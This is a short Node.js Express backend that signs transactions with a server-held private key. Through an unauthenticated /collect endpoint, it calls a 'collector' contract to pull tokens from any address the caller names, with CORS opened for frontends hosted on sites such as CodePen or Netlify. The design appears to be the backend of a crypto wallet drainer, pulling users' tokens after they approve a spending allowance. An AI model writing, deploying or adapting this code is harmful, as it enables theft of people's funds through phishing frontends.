const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();
app.use(bodyParser.json());
app.use(cors()); // allow frontend like CodePen/Netlify

// Provider + Wallet
const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

// Collector ABI (only need collect)
const COLLECTOR_ABI = [
  "function collect(address from, uint256 amount) external"
];

const collector = new ethers.Contract(
  process.env.COLLECTOR_ADDRESS,
  COLLECTOR_ABI,
  wallet
);

// ✅ Health check
app.get("/ping", (req, res) => {
  res.send("Collector backend is alive ✅");
});

// ✅ Collect tokens
app.post("/collect", async (req, res) => {
  try {
    const { userAddress, amount } = req.body;
    if (!userAddress || !amount) {
      return res.status(400).json({ error: "Missing params" });
    }

    // USDT has 18 or 6 decimals depending on token (BSC USDT = 18)
    const decimals = 18;
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);

    const tx = await collector.collect(userAddress, amountInWei);
    await tx.wait();

    res.json({ success: true, txHash: tx.hash });
  } catch (err) {
    console.error("Collector error:", err);
    res.status(500).json({ error: err.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Collector backend running on port ${PORT}`));
